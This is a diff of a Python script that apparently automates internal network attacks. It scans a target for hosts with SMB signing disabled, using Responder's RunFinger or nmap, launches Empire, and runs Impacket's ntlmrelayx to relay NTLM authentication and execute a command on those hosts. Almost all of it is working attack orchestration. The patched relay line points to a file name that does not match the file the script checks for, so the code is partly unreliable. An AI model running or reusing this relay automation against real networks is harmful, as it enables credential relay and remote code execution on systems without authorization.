@@ -102,7 +102,7 @@ def main():
     
     if launch_relayx:
         print("Getting relay target list")
-        subprocess.Popen("/opt/check-smb-signing.sh --nmap --out-dir /tmp -a %s" % (target_ip), shell=True).wait()
+        subprocess.Popen("/opt/check-smb-signing.sh --finger --finger-path /opt/Responder/tools/RunFinger.py --out-dir /tmp -a %s" % (target_ip), shell=True).wait()
     
     if launch_empire:
         print("\nLaunching Empire (waiting 5s)...")
@@ -152,7 +152,7 @@ def main():
         fileinput.close()
         
         if os.path.exists("/tmp/hosts-signing-disabled"):
-            command = "ntlmrelayx.py -smb2support -tf %s -c '%s'" % ("/tmp/hosts-signing-disabled.txt", relayx_command)
+            command = "ntlmrelayx.py -smb2support -tf %s -c '%s'" % ("/tmp/hosts-signing-false.txt", relayx_command)
         else:
             command = "ntlmrelayx.py -smb2support -c '%s'" % (relayx_command)
             
